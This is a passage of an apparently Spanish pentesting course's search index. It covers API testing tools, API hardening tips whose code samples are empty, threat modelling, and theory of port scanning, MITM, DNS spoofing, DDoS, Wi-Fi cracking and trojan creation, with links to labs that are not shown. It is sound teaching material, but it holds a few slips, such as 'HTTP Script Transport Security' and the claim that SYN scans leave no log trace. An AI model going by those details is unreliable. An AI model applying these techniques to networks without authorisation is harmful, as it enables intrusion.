\u201cpassword\u201d:\u201dpassword123\u201d}</li> <li>Enviar la solicitud y analizar la respuesta</li> </ol> </li> <li> <p>Ventajas para pentesting:</p> <ul> <li>F\u00e1cil manipulaci\u00f3n de par\u00e1metros y headers</li> <li>Capacidad para guardar y repetir solicitudes complejas</li> <li>Integraci\u00f3n con Newman para automatizaci\u00f3n de pruebas</li> </ul> </li> </ul>"},{"location":"pentest/pentest-apis/#swagger-inspector","title":"Swagger Inspector","text":"<ul> <li>Descripci\u00f3n: Herramienta en l\u00ednea para validar y probar APIs RESTful</li> <li>Caracter\u00edsticas principales:<ul> <li>Validaci\u00f3n de especificaciones OpenAPI/Swagger</li> <li>Generaci\u00f3n autom\u00e1tica de documentaci\u00f3n</li> <li>Pruebas de endpoints directamente desde la interfaz web</li> </ul> </li> <li> <p>Ejemplo de uso:</p> <ol> <li>Pegar la URL de la especificaci\u00f3n OpenAPI (ej. https://api.target.com/swagger.json)</li> <li>Swagger Inspector cargara todos los endpoints disponibles</li> <li>Seleccionar un endpoint y enviar una solicitud de prueba</li> <li>Analizar la respuesta y la conformidad con la especificaci\u00f3n</li> </ol> </li> <li> <p>Ventajas para pentesting:</p> <ul> <li>R\u00e1pida comprensi\u00f3n de la estructura de la API</li> <li>Identificaci\u00f3n de endpoints y par\u00e1metros no documentados</li> <li>F\u00e1cil detecci\u00f3n de discrepancias entre la documentaci\u00f3n y la implementaci\u00f3n real</li> </ul> </li> </ul>"},{"location":"pentest/pentest-apis/#soapui","title":"SoapUI","text":"<ul> <li>Descripci\u00f3n: Herramienta de pruebas funcionales para APIs SOAP y REST</li> <li>Caracter\u00edsticas principales:<ul> <li>Soporte para m\u00faltiples protocolos (SOAP, REST, GraphQL)</li> <li>Creaci\u00f3n de casos de prueba complejos</li> <li>Simulaci\u00f3n de servicios (mocking)</li> <li>Pruebas de carga y rendimiento</li> </ul> </li> <li> <p>Ejemplo de uso:</p> <ol> <li>Crear un nuevo proyecto REST importando la definici\u00f3n de la API</li> <li>Generar casos de prueba de seguridad autom\u00e1ticamente (en la versi\u00f3n Pro)</li> <li>Ejecutar pruebas de inyecci\u00f3n SQL en par\u00e1metros de consulta</li> <li>Analizar los resultados y los logs generados</li> </ol> </li> <li> <p>Ventajas para pentesting:</p> <ul> <li>Amplia gama de pruebas de seguridad predefinidas</li> <li>Capacidad para personalizar y crear pruebas de seguridad complejas</li> <li>Integraci\u00f3n con otras herramientas de seguridad</li> </ul> </li> </ul>"},{"location":"pentest/pentest-apis/#herramientas-de-fuzzing","title":"Herramientas de fuzzing","text":""},{"location":"pentest/pentest-apis/#burp-suite","title":"Burp Suite","text":"<ul> <li>Descripci\u00f3n: Suite completa de herramientas para pruebas de seguridad en aplicaciones web y APIs</li> <li>Caracter\u00edsticas principales:<ul> <li>Proxy de intercepci\u00f3n</li> <li>Scanner de vulnerabilidades (Versi\u00f3n Pro)</li> <li>Intruder para ataques automatizados</li> <li>Repeater para manipulaci\u00f3n y reenv\u00edo de solicitudes</li> </ul> </li> <li> <p>Ejemplo de uso del Intruder para fuzzing:</p> <ol> <li>Capturar una solicitud a la API a trav\u00e9s del proxy</li> <li>Enviar la solicitud al Intruder</li> <li>Configurar los puntos de inserci\u00f3n (par\u00e1metros a fuzzear)</li> <li>Cargar una lista de payloads (ej. SQLi, XSS)</li> <li>Iniciar el ataque y analizar las respuestas</li> </ol> </li> <li> <p>Ventajas para pentesting:</p> <ul> <li>Capacidades avanzadas de manipulaci\u00f3n de solicitudes</li> <li>Potente motor de fuzzing con m\u00faltiples opciones de configuraci\u00f3n</li> <li>Extensibilidad mediante plugins y extensiones personalizadas</li> </ul> </li> </ul>"},{"location":"pentest/pentest-apis/#owasp-zap-zed-attack-proxy","title":"OWASP ZAP (Zed Attack Proxy)","text":"<ul> <li>Descripci\u00f3n: Herramienta de c\u00f3digo abierto para encontrar vulnerabilidades en aplicaciones web y APIs</li> <li>Caracter\u00edsticas principales:<ul> <li>Proxy de intercepci\u00f3n</li> <li>Scanner de vulnerabilidades automatizado</li> <li>Fuzzer integrado</li> <li>Soporte para scripts personalizados</li> </ul> </li> <li> <p>Ejemplo de uso del Fuzzer:</p> <ol> <li>Capturar una solicitud a la API</li> <li>Hacer clic derecho y seleccionar \u201cFuzz\u201d</li> <li>Seleccionar el par\u00e1metro a fuzzear</li> <li>Elegir o crear una lista de payloads</li> <li>Ejecutar el fuzzing y analizar los resultados</li> </ol> </li> <li> <p>Ventajas para pentesting:</p> <ul> <li>Completamente gratuito y de c\u00f3digo abierto</li> <li>Actualizaciones frecuentes con nuevas funcionalidades</li> <li>Amplia comunidad de usuarios y desarrolladores</li> </ul> </li> </ul>"},{"location":"pentest/pentest-apis/#fuzzdb","title":"Fuzzdb","text":"<ul> <li>Descripci\u00f3n: Colecci\u00f3n de patrones y payloads para fuzzing y pentesting</li> <li>Caracter\u00edsticas principales:<ul> <li>Amplia variedad de listas de palabras y payloads</li> <li>Categorizaci\u00f3n por tipo de ataque y tecnolog\u00eda</li> <li>F\u00e1cil integraci\u00f3n con otras herramientas de fuzzing</li> </ul> </li> <li>Ejemplo de uso: </li> <li>Ventajas para pentesting:<ul> <li>Payloads espec\u00edficos para diferentes tipos de vulnerabilidades</li> <li>Listas actualizadas regularmente con nuevos patrones de ataque</li> <li>Facilita la creaci\u00f3n de pruebas de fuzzing exhaustivas</li> </ul> </li> </ul> <p>Integraci\u00f3n con Newman para automatizaci\u00f3n de pruebas</p>"},{"location":"pentest/pentest-apis/#proxies-de-interceptacion","title":"Proxies de interceptaci\u00f3n","text":""},{"location":"pentest/pentest-apis/#burp-suite-mencionado-anteriormente","title":"Burp Suite (Mencionado anteriormente)","text":""},{"location":"pentest/pentest-apis/#owasp-zap-mencionado-anteriormente","title":"OWASP ZAP (Mencionado anteriormente)","text":""},{"location":"pentest/pentest-apis/#fiddler","title":"Fiddler","text":"<ul> <li>Descripci\u00f3n: Proxy de depuraci\u00f3n web que puede ser utilizado para interceptar y modificar tr\u00e1fico API</li> <li>Caracter\u00edsticas principales:<ul> <li>Interceptaci\u00f3n y modificaci\u00f3n de tr\u00e1fico HTTP/HTTPS</li> <li>Soporte para dispositivos m\u00f3viles y aplicaciones de escritorio</li> <li>Scripting extensible de FiddlerScript</li> </ul> </li> <li> <p>Ejemplo de uso:</p> <ol> <li>Configurar Fiddler como proxy en el sistema o aplicaci\u00f3n</li> <li>Capturar tr\u00e1fico hacia y desde la API objetivo</li> <li>Utilizar el \u201cRequest Builder\u201d para modificar y reenviar solicitudes</li> <li>Analizar las respuestas en el inspector de Fiddler</li> </ol> </li> <li> <p>Ventajas para pentesting:</p> <ul> <li>Interfaz intuitiva y f\u00e1cil de usar</li> <li>Potentes capacidades de scripting para automatizaci\u00f3n</li> <li>Excelente para analizar APIs en aplicaciones m\u00f3viles y de escritorio</li> </ul> </li> </ul>"},{"location":"pentest/pentest-apis/#herramientas-especializadas-en-apis","title":"Herramientas especializadas en APIs","text":""},{"location":"pentest/pentest-apis/#astras-api-security-testing-tool","title":"Astra\u2019s API Security Testing Tool","text":"<ul> <li>Descripci\u00f3n: Herramienta automatizada espec\u00edficamente dise\u00f1ada para pruebas de seguridad en APIS</li> <li>Caracter\u00edsticas principales:<ul> <li>Escaneo autom\u00e1tico de vulnerabilidades en APIs</li> <li>Pruebas basadas en OWASP API Security Top 10</li> <li>Generaci\u00f3n de informes detallados</li> </ul> </li> <li> <p>Proceso de uso:</p> <ol> <li>Importar la especificaci\u00f3n de la PI (Swagger/OpenAPI)</li> <li>Configurar los par\u00e1metros de autenticaci\u00f3n</li> <li>Iniciar el escaneo autom\u00e1tico</li> <li>Revisar el informe de vulnerabilidades generado</li> </ol> </li> <li> <p>Ventajas:</p> <ul> <li>Enfoque especifico en seguridad de APIs</li> <li>Detecci\u00f3n automatizada de vulnerabilidades comunes en APIs</li> <li>Integraci\u00f3n con flujos de trabajo de CI/CD</li> </ul> </li> </ul>"},{"location":"pentest/pentest-apis/#apisec","title":"APIsec","text":"<ul> <li>Descripci\u00f3n: Plataforma de seguridad continua para APIs</li> <li>Caracter\u00edsticas principales:<ul> <li>Pruebas de seguridad automatizadas</li> <li>Generaci\u00f3n de casos de prueba basados en la especificaci\u00f3n de la API</li> <li>Integraci\u00f3n con herramientas de CI/CD</li> </ul> </li> <li> <p>Proceso de uso:</p> <ol> <li>Conectar APIsec a la infraestructura de CI/CD</li> <li>Importar la especificaci\u00f3n de la API</li> <li>Configurar las pol\u00edticas de seguridad</li> <li>Ejecutar pruebas autom\u00e1ticas en cada despliegue</li> </ol> </li> <li> <p>Ventajas:</p> <ul> <li>Pruebas de seguridad continuas</li> <li>Detecci\u00f3n temprana de vulnerabilidades en el ciclo de desarrollo</li> <li>Amplia cobertura de pruebas de seguridad espec\u00edficas para APIs</li> </ul> </li> </ul>"},{"location":"pentest/pentest-apis/#42crunch-api-security-testing","title":"42Crunch API Security Testing","text":"<ul> <li>Descripci\u00f3n: Plataforma que combina auditoria est\u00e1tica, seguridad din\u00e1mica y protecci\u00f3n en tiempo de ejecuci\u00f3n para APIs</li> <li>Caracter\u00edsticas principales:<ul> <li>Auditoria de especificaciones OpenAPI</li> <li>Escaneo din\u00e1mico de seguridad</li> <li>Firewall de API integrado</li> </ul> </li> <li> <p>Proceso de uso:</p> <ol> <li>Cargar la especificaci\u00f3n OpenAPI en la plataforma</li> <li>Ejecutar la auditoria est\u00e1tica para identificar problemas de dise\u00f1o</li> <li>Configurar y ejecutar pruebas din\u00e1micas</li> <li>Implementar el firewall de API para protecci\u00f3n en tiempo real</li> </ol> </li> <li> <p>Ventajas:</p> <ul> <li>Enfoque integral que cubre el ciclo de vida completo de la API</li> <li>Identificaci\u00f3n de problemas tanto en el dise\u00f1o como en la implementaci\u00f3n</li> <li>Capacidades de protecci\u00f3n en tiempo real</li> </ul> </li> </ul>"},{"location":"pentest/pentest-apis/#mejores-practicas-y-mitigacion","title":"MEJORES PRACTICAS Y MITIGACION","text":""},{"location":"pentest/pentest-apis/#implementacion-de-autenticacion-fuerte","title":"Implementaci\u00f3n de autenticaci\u00f3n fuerte","text":"<ul> <li>Utilizar OAuth 2.0 y OpenID Connect para autenticaci\u00f3n y autorizaci\u00f3n</li> <li>Implementar autenticaci\u00f3n de dos factores (2FA) para cuentas criticas</li> <li>Usar tokens JWT (JSON Web Tokens) con las siguientes consideraciones:</li> <li>Establecer tiempos de expiraci\u00f3n cortos (ej. 15 min)</li> <li>Incluir claims como \u2018iat\u2019 (issued at) y \u2018nbf\u2019 (not before)</li> <li>Firmar tokens con algoritmos seguros (ej. RS256)</li> <li>Ejemplo de configuraci\u00f3n de JWT en Node.js con jsonwebtoken: </li> </ul>"},{"location":"pentest/pentest-apis/#uso-de-https-para-todas-las-comunicaciones","title":"Uso de HTTPS para todas las comunicaciones","text":"<ul> <li>Forzar HTTPS en todos los endpoints de la API</li> <li>Implementar HSTS (HTTP Script Transport Security)</li> <li>Configurar certificados SSL/TLS correctamente y mantenerlos actualizados</li> <li>Ejemplo de configuraci\u00f3n de HSTS en un servidor Node.js con Express: </li> </ul>"},{"location":"pentest/pentest-apis/#implementacion-de-rate-limiting-y-throttling","title":"Implementaci\u00f3n de rate limiting y throttling","text":"<ul> <li>Limitar el n\u00famero de solicitudes por usuario/IP en un periodo de tiempo</li> <li>Implementar retrasos crecientes para solicitudes repetidas</li> <li>Utilizar headers como \u2018X-RateLimit-Limit\u2019 y \u2018X-RateLimit-Remaining\u2019 para informar al cliente</li> <li>Ejemplo de implementaci\u00f3n de rate limiting con Express: </li> </ul>"},{"location":"pentest/pentest-apis/#validacion-y-sanitizacion-de-entradas-de-usuario","title":"Validaci\u00f3n y sanitizaci\u00f3n de entradas de usuario","text":"<ul> <li>Validar todos los par\u00e1metros de entrada en el servidor</li> <li>Implementar listas blancas para valores permitidos</li> <li>Sanitizar datos antes de usarlos en consultas o respuestas</li> <li>Ejemplo de validaci\u00f3n en Node.js con Joli: </li> </ul>"},{"location":"pentest/pentest-apis/#principio-de-minimo-privilegio-en-autorizaciones","title":"Principio de m\u00ednimo privilegio en autorizaciones","text":"<ul> <li>Asignar los m\u00ednimos permisos necesarios a cada rol de usuario</li> <li>Implementar controles de acceso granulares a nivel de recurso</li> <li>Revisar y editar peri\u00f3dicamente los permisos asignados</li> </ul>"},{"location":"pentest/pentest-apis/#implementacion-de-controles-de-seguridad","title":"Implementaci\u00f3n de controles de seguridad","text":"<p>Web Application Firewalls (WAF) configurados para APIs:</p> <ul> <li>Implementar reglas espec\u00edficas para proteger endpoints de API</li> <li>Configurar el WAF para detectar y bloquear patrones de ataque comunes</li> <li>Mantener las reglas del WAF actualizadas con las \u00faltimas amenazas</li> <li>Ejemplo de regla ModSecurity para proteger contra inyecci\u00f3n SQL: </li> </ul>"},{"location":"pentest/pentest-apis/#monitoreo-continuo-y-logging","title":"Monitoreo continuo y logging","text":"<ul> <li>Implementar logging detallado de todas las actividades de la API</li> <li>Utilizar herramientas de SIEM (Security Information and Event Management) para an\u00e1lisis en tiempo real</li> <li>Configurar alertas para actividades sospechosas y an\u00f3malas</li> <li>Ejemplo de logging en Node.js con Winston: </li> </ul>"},{"location":"pentest/pentest-apis/#gestion-segura-de-secretos-y-claves","title":"Gesti\u00f3n segura de secretos y claves","text":"<ul> <li>Utilizar sistemas de gesti\u00f3n de secretos como HashiCorp Vault o AWS Secrets Manager</li> <li>Rotar regularmente las claves y secretos</li> <li>Nunca almacenar secretos en c\u00f3digo fuente o sistemas de control de versiones</li> <li>Ejemplo de uso de Vault en Node.js: </li> </ul>"},{"location":"pentest/pentest-apis/#actualizaciones-regulares-y-gestion-de-parches","title":"Actualizaciones regulares y gesti\u00f3n de parches:","text":"<ul> <li>Mantener todas las dependencias y bibliotecas actualizadas</li> <li>Implementar un proceso de gesti\u00f3n de parches para aplicar actualizaciones de seguridad r\u00e1pidamente</li> <li>Utilizar herramientas de an\u00e1lisis de dependencias para identificar vulnerabilidades conocidas</li> <li>Ejemplo de uso de npm Audit en un proyecto Node.js: </li> </ul>"},{"location":"pentest/pentest-apis/#implementacion-de-cors-adecuada","title":"Implementaci\u00f3n de CORS adecuada","text":"<ul> <li>Configurar CORS (Cross-Origin Resource Sharing) de manera restrictiva</li> <li>Especificar expl\u00edcitamente los or\u00edgenes permitidos</li> <li>Evitar el uso de \u2018Access-Control-Allow-Origin: *\u2019 en APIs que requieran autenticaci\u00f3n.</li> <li>Ejemplo de configuraci\u00f3n de CORS en Express: </li> </ul>"},{"location":"pentest/pentest-apis/#implementacion-de-content-security-policy-csp","title":"Implementaci\u00f3n de Content Security Policy (CSP)","text":"<ul> <li>Definir pol\u00edticas estrictas para prevenir ataques XSS y de inyecci\u00f3n de contenido</li> <li>Utilizar nonces o hashes para scripts inline cuando sea necesario</li> <li>Monitorear y ajustar la CSP bas\u00e1ndose en los reportes de violaciones.</li> <li>Ejemplo de CSP para una API: </li> </ul>"},{"location":"pentest/pentest-apis/#implementacion-de-seguridad-en-profundidad","title":"Implementaci\u00f3n de seguridad en profundidad","text":"<ul> <li>Aplicar m\u00faltiples capas de seguridad en lugar de confiar en una sola medida</li> <li>Implementar controles de seguridad tanto a nivel de red como de aplicaci\u00f3n</li> <li>Utilizar el principio de \"defensa en profundidad\" en toda la arquitectura de la API</li> </ul>"},{"location":"teoria/amenazas-modelado/","title":"PASOS PARA PLANIFICAR CON \u00c9XITO UNA PRUEBA DE PENETRACION","text":""},{"location":"teoria/amenazas-modelado/#modelizacion-de-amenazas","title":"MODELIZACION DE AMENAZAS","text":""},{"location":"teoria/amenazas-modelado/#por-que-el-modelado-de-amenazas","title":"\u00bfPOR QUE EL MODELADO DE AMENAZAS?","text":"<ul> <li>Identificar, investigar y clasificar las amenazas y vulnerabilidades potenciales.</li> <li>Identificar los procesos l\u00f3gicos de pensamiento parta definir la seguridad del sistema</li> <li>Creaci\u00f3n de un conjunto de documentos est\u00e1ndar que pueden utilizarse para crear especificaciones y pruebas de seguridad y evitar la duplicaci\u00f3n de esfuerzos en materia de seguridad en el futuro.</li> <li>Reducir amenazas y vulnerabilidades</li> <li>Definici\u00f3n del nivel de seguridad global de un sistema o aplicaci\u00f3n</li> </ul>"},{"location":"teoria/amenazas-modelado/#tecnicas-de-modelizacion-de-amenazas","title":"TECNICAS DE MODELIZACION DE AMENAZAS","text":"| **T\u00e9cnica** | | :---: | | Arboles de ataque | | STRIDE | | Elevaci\u00f3n de privilegios | | T-MAP | | Petri Net | | Diagrama de flujo de datos | | Diagrama de actividades | | Visi\u00f3n general de la reducci\u00f3n de riesgos |"},{"location":"teoria/amenazas-modelado/#modelo-stride","title":"MODELO STRIDE","text":""},{"location":"teoria/ataque-redes/","title":"FORMAS DE ATACAR UNA RED","text":""},{"location":"teoria/ataque-redes/#wireshark-simplificado","title":"WIRESHARK SIMPLIFICADO","text":"<p>Herramienta de rastreo usada para comprender un protocolo, depurar un problema de red, analizar el tr\u00e1fico, utiliza Libcap en Linux y Winpcap en Windows y su secreto est\u00e1 en utilizar los filtros Capturar y Mostrar. </p>  [PRACTICA WIRESHARK](../laboratorio/wireshark-lab.md#laboratorio-1-interaccion-basica)"},{"location":"teoria/ataque-redes/#como-funciona-la-exploracion-de-puertos","title":"COMO FUNCIONA LA EXPLORACION DE PUERTOS","text":"<p>El escaneado de puertos es el proceso de verificar los puertos abiertos (TCP o UDP)</p> <ul> <li>M\u00e9todos de escaneo de puertos.<ul> <li>Connect el cual est\u00e1 basado en el mecanismo de saludo TCP, implica enviar un paquete de saludo TCP completo a cada puerto objetivo, este escaneo completa el 3-Way TCP Handshake y se usa para determinar si un puerto especifico est\u00e1 abierto.</li> <li>SYN/Stealth el cual implica el env\u00edo de paquetes de env\u00edo a varios puertos en la m\u00e1quina objetivo, no completa el 3-Way TCP Handshake, se considera m\u00e1s sigiloso y discreto que el Connect Scan y es utilizado para descubrir puertos abiertos sin dejar rastro en los logs del objetivo.</li> <li>Escaneo UDP, mientras que TCP est\u00e1 orientado a la conexi\u00f3n, UDP es sin estado por lo que no implica el establecimiento de conexi\u00f3n por 3-Way siendo diferente su escaneo, en este los paquetes se env\u00edan a los puertos objetivo sin esperar una respuesta de confirmaci\u00f3n de los puertos cerrados, lo que dificulta la detecci\u00f3n precisa de los puertos abiertos, por lo que, debido a la falta de respuesta en los puertos cerrados, el escaneo UDP puede ser m\u00e1s lento y menos fiable que el TCP.</li> </ul> </li> <li>Nmap es una gran herramienta de c\u00f3digo abierto para escanear redes, utilizada para descubrir dispositivos, puertos abiertos y servicios en una red, ofrece t\u00e9cnicas de escaneo TCP, UDP y detecci\u00f3n de SO. Ampliamente utilizada en seguridad inform\u00e1tica y administraci\u00f3n de redes.</li> <li>Consideraciones sobre el tr\u00e1fico al usar esta herramienta es que estos mil puertos predeterminados pueden generar hasta 70KB de tr\u00e1fico dependiendo de la configuraci\u00f3n de la red y de la respuesta de los servicios en los puertos escaneados. Sin embargo, si se ampl\u00eda el escaneo para incluir todos los 65,536 puertos posibles, el tr\u00e1fico generado puede ser mucho mayor, alcanzando alrededor de 4MB solo para un host.</li> </ul> <p>Por lo que ahora \u00bfQu\u00e9 tal el escaneo de una red de clase C con 254 hosts, o incluso de una red clase B? Pues imaginando que se escanean todos los puertos de todos los Host en una red de clase C podemos llegar a generar un tr\u00e1fico de alrededor 1GB por lo que hacer un escaneo completo en una red clase B imagina la cantidad de tr\u00e1fico que se estar\u00eda generando, conteniendo hasta 65,536 hosts.</p>  [PRACTICA DE NMAP](../laboratorio/nmap-lab.md#laboratorio-1-escaneo-local-de-puertos)"},{"location":"teoria/ataque-redes/#ejecutar-ataques-man-in-the-middle","title":"EJECUTAR ATAQUES MAN-IN-THE-MIDDLE","text":"<p>CIRCUNSTANCIAS NORMALES DE UNA CONEXI\u00d3N </p> <p>CIRCUNSTANCIAS ANORMALES DE UNA CONEXI\u00d3N (ARP SPOOFED) </p>  [PRACTICA MIM](../laboratorio/ettercap-lab.md#laboratorio-1-man-in-the-middle)"},{"location":"teoria/ataque-redes/#realizar-un-ataque-de-suplantacion-de-dns","title":"REALIZAR UN ATAQUE DE SUPLANTACION DE DNS","text":"<p>La suplantaci\u00f3n DNS, es una t\u00e9cnica utilizada para manipular las respuestas del sistema de nombres de dominio (DNS) de manera que los usuarios sean dirigidos a direcciones IP incorrectas o maliciosas cuando intentan accedes a un sitio web.</p> <p>Su funcionamiento b\u00e1sico implica interceptar y falsificar las respuestas DNS enviadas desde un servidor DNS leg\u00edtimo, una vez que el atacante ha logrado falsificar las respuestas DNS puede redirigir a los usuarios a sitios web falsos que se asemejan a sitios leg\u00edtimos. Esto puede conducir a diversas formas de ataques como phishing, robo de credenciales, malware, entre otros.</p>  [PRACTICA SPOOFING](../laboratorio/ettercap-lab.md#laboratorio-2-dns-spoofing)"},{"location":"teoria/ataque-redes/#planificar-ataques-dos-y-ddos","title":"PLANIFICAR ATAQUES DOS Y DDOS","text":"<p>Estos ataques son t\u00e9cnicas utilizadas para inundar un sistema, red o servicio con tr\u00e1fico malicioso con el objetivo de hacerlo inaccesible para los usuarios leg\u00edtimos.</p> <p>Los ataques DOS son ataques desde un solo dispositivo comprometido que env\u00eda una cantidad abrumadora de tr\u00e1fico a un objetivo espec\u00edfico como un servidor web con el objetivo de sobrecargarlo y hacerlo inaccesible para los usuarios leg\u00edtimos.</p> <p>Los ataques DDOS son ataques desde m\u00faltiples dispositivos comprometidos conocidos como botnets que coordinan esfuerzos para enviar grandes vol\u00famenes de tr\u00e1fico malicioso hacia un objetivo espec\u00edfico.</p> <p>CLASIFICACIONES DE LOS ATAQUES DDOS:</p> <ul> <li>Basados en volumen: Centrados en inundar la red o servicio objetivo con una gran cantidad de tr\u00e1fico. Ejemplos incluyen ataques SYN, inundaci\u00f3n UDP, inundaci\u00f3n ICMP, etc.</li> <li>Basados en protocolos: Estos explotan debilidades en los protocolos de red para sobrecargar los recursos del objetivo. Ejemplos incluyen ataques de amplificaci\u00f3n de DNS, ataques NTP amplificados, etc.</li> <li>Ataques a la capa de aplicaci\u00f3n: Estos ataques se dirigen a las vulnerabilidades de las aplicaciones y servicios espec\u00edficos en lugar de abrumar la infraestructura de red. Ejemplos incluyen ataques de inundaci\u00f3n HTTP, ataques de SQL injection, ataques de Cross-Site Scriptin (XSS), etc.</li> </ul>"},{"location":"teoria/ataque-redes/#atacar-redes-inalambricas","title":"ATACAR REDES INALAMBRICAS","text":"<p>El ataque a redes inal\u00e1mbricas es un tipo de ciberataque dirigido a redes Wifi para comprometer su seguridad y obtener acceso no autorizado a la red o a la informaci\u00f3n transmitida a trav\u00e9s de ella. Los atacantes pueden aprovechar diferentes vulnerabilidades en los protocolos de seguridad utilizados por las redes Wifi para llevar a cabo estos ataques.</p> <p>COMPARACION DE WPAs </p>"},{"location":"teoria/ataque-redes/#herramientas-de-hacking","title":"HERRAMIENTAS DE HACKING","text":"<ul> <li>WPA/WPA2</li> <li>airmon-ng: Pone la tarjeta inal\u00e1mbrica en modo monitor</li> <li>airdump-ng: Guarda el tr\u00e1fico a\u00e9reo en archivos PCAP y muestra informaci\u00f3n sobre las redes</li> <li>aireplay-ng: Inyector de paquetes WEP</li> <li>Fern WiFi: Crackea y recupera claves WEP/WPA/WPS y tambi\u00e9n ejecuta otros ataques de red basados en redes inal\u00e1mbricas o Ethernet</li> <li>Reaver: Realiza ataques de fuerza bruta contra los PIN de registro de Wifi Protected Setup (WPS) para recuperar las contrase\u00f1as WPA/WPA2</li> </ul>"},{"location":"teoria/ataque-redes/#wep-cracking","title":"WEP CRACKING","text":"<p>WEP fue uno de los primeros protocolos de seguridad utilizados en redes WiFi. Sin embargo, se descubrieron m\u00faltiples vulnerabilidades en su implementaci\u00f3n que permiten a los atacantes interceptar y descifrar el tr\u00e1fico de la red con relativa facilidad. Como resultado, se considera inseguro y obsoleto, y no se recomienda su uso.</p>  [PRACTICA WEP CRACK](../laboratorio/ataques-redes-inalambricas-lab.md#laboratorio-1-fern-wifi-cracker)"},{"location":"teoria/ataque-redes/#wpa-y-wpa2-cracking","title":"WPA Y WPA2 CRACKING","text":"<p>WPA fue desarrollado como una mejora de seguridad sobre WEP. Utiliza un cifrado m\u00e1s robusto y t\u00e9cnicas de autenticaci\u00f3n m\u00e1s s\u00f3lidas para proteger las comunicaciones inal\u00e1mbricas. Sin embargo, algunas versiones tempranas de WPA tambi\u00e9n han sido vulnerables a ataques de fuerza bruta y otros m\u00e9todos de explotaci\u00f3n.</p> <p>WPA2 es la versi\u00f3n m\u00e1s segura y ampliamente utilizada de los protocolos de seguridad WiFi en la actualidad. Utiliza el cifrado AES (Advanced Encryption Standard) y el protocolo de autenticaci\u00f3n de claves de precompartidas (PSK) para garantizar la seguridad de la red. Aunque WPA2 es generalmente seguro, se han descubierto algunas vulnerabilidades, como el ataque KRACK (Key Reinstallation Attack), que afect\u00f3 a algunas implementaciones de WPA2.</p>  [PRACTICA WPA &amp; WPA2 CRACK](../laboratorio/ataques-redes-inalambricas-lab.md#laboratorio-2-fuerza-bruta)"},{"location":"teoria/ataque-redes/#wps-cracking","title":"WPS CRACKING","text":"<p>WPS es un protocolo dise\u00f1ado para simplificar el proceso de configuraci\u00f3n y conexi\u00f3n de dispositivos a redes WiFi. Sin embargo, se han descubierto m\u00faltiples vulnerabilidades en WPS que permiten a los atacantes obtener acceso no autorizado a la red WiFi utilizando m\u00e9todos como el ataque de PIN WPS y el ataque de fuerza bruta. Por esta raz\u00f3n, se recomienda desactivar WPS en los enrutadores y dispositivos WiFi para mejorar la seguridad de la red.</p>  [PRACTICA WPS CRACK](../laboratorio/ataques-redes-inalambricas-lab.md#laboratorio-3-wps-crack)"},{"location":"teoria/infiltracion/","title":"Infiltracion","text":""},{"location":"teoria/infiltracion/#transferir-payload-a-una-maquina-windows","title":"TRANSFERIR PAYLOAD A UNA MAQUINA WINDOWS","text":"<p>Existen muchas maneras de enviar un Payload, ya sea por correo electr\u00f3nico, enlaces, mensajes, USB, entre otros, sin embargo, nosotros al tener acceso a las 2 m\u00e1quinas lo haremos de una forma distinta.</p>  [PRACTICA TRANSFERENCIA DE ARCHIVOS](../laboratorio/transferencia-archivos.md)"},{"location":"teoria/infiltracion/#crear-su-primer-troyano-e-infiltrarse-en-un-objetivo","title":"CREAR SU PRIMER TROYANO E INFILTRARSE EN UN OBJETIVO","text":"<p>Un troyano es un tipo de software malicioso dise\u00f1ado para enga\u00f1ar a los usuarios haci\u00e9ndoles creer que es un programa leg\u00edtimo o \u00fatil, pero en realidad tiene intenciones da\u00f1inas ocultas. Una vez que un usuario ejecuta o instala un troyano en su sistema, este puede realizar una variedad de acciones no autorizadas, como robar informaci\u00f3n confidencial, tomar el control del sistema, instalar malware adicional, enviar spam, realizar ataques de denegaci\u00f3n de servicio (DDoS) o incluso da\u00f1ar archivos y software.</p>  [PRACTICA CREACION E INFILTRACION DE TROYANO](../laboratorio/metasploit-lab.md#laboratorio-2-creacion-de-troyano-e-infiltracion-a-objetivo)"},{"location":"teoria/vulnerabilidades-web/","title":"Vulnerabilidades en Sitios Web","text":""},{"location":"teoria/vulnerabilidades-web/#formas-de-atacar-una-aplicacion-web","title":"FORMAS DE ATACAR UNA APLICACI\u00d3N WEB","text":"<p>Las aplicaciones web son extremadamente atractivas para los hackers por muchas razones diferentes especialmente cuando estas aplicaciones web est\u00e1n mal administrados y no parcheadas, convirti\u00e9ndose en muy f\u00e1ciles objetivos a atacar, las fallas de seguridad a un alto nivel pueden ser:</p> <ul> <li> <p>No determinar de antemano los requisitos de seguridad - Esto se refiere a no considerar la seguridad desde el principio del desarrollo de la aplicaci\u00f3n web. Por ejemplo, si un equipo de desarrollo no identifica los posibles riesgos de seguridad durante la fase de planificaci\u00f3n, es m\u00e1s probable que la aplicaci\u00f3n resultante sea vulnerable a ataques.</p> </li> <li> <p>Creaci\u00f3n de dise\u00f1os conceptuales con errores l\u00f3gicos - Esto implica dise\u00f1ar la aplicaci\u00f3n web con defectos l\u00f3gicos que podr\u00edan ser explotados por un atacante para comprometer la seguridad. Por ejemplo, un dise\u00f1o conceptual defectuoso podr\u00eda permitir a un usuario acceder a funciones o datos sensibles sin la debida autorizaci\u00f3n.</p> </li> <li> <p>Utilizar pr\u00e1cticas de codificaci\u00f3n deficientes que introducen vulnerabilidades t\u00e9cnicas - Se refiere a escribir c\u00f3digo de forma descuidada o sin seguir buenas pr\u00e1cticas de seguridad, lo que puede introducir vulnerabilidades en la aplicaci\u00f3n. Por ejemplo, el uso de funciones de entrada de usuario no validadas podr\u00eda conducir a vulnerabilidades de inyecci\u00f3n de c\u00f3digo, como SQL injection o XSS (Cross-Site Scripting).</p> </li> <li> <p>Implementaci\u00f3n incorrecta de software - Esto ocurre cuando el c\u00f3digo desarrollado no se implementa correctamente en el entorno de producci\u00f3n. Por ejemplo, si las configuraciones del servidor no se ajustan adecuadamente para mitigar riesgos conocidos de seguridad, como la falta de actualizaciones de software o la configuraci\u00f3n incorrecta de permisos de archivos y directorios, la aplicaci\u00f3n puede ser vulnerable a ataques.</p> </li> <li> <p>Introducci\u00f3n de fallos durante el mantenimiento o la actualizaci\u00f3n - Incluso despu\u00e9s de que una aplicaci\u00f3n web haya sido desarrollada e implementada con \u00e9xito, seguir\u00e1 siendo vulnerable si no se aplican correctamente las actualizaciones de seguridad o si se introducen nuevos errores durante el mantenimiento. Por ejemplo, si una actualizaci\u00f3n de software no se instala correctamente o introduce nuevas vulnerabilidades, la seguridad de la aplicaci\u00f3n puede verse comprometida.</p> </li> </ul>"},{"location":"teoria/vulnerabilidades-web/#owasp-top-10","title":"OWASP TOP 10","text":"<ul> <li>Broken Access Control (Control de acceso roto): Se refiere a la incapacidad de una aplicaci\u00f3n para aplicar 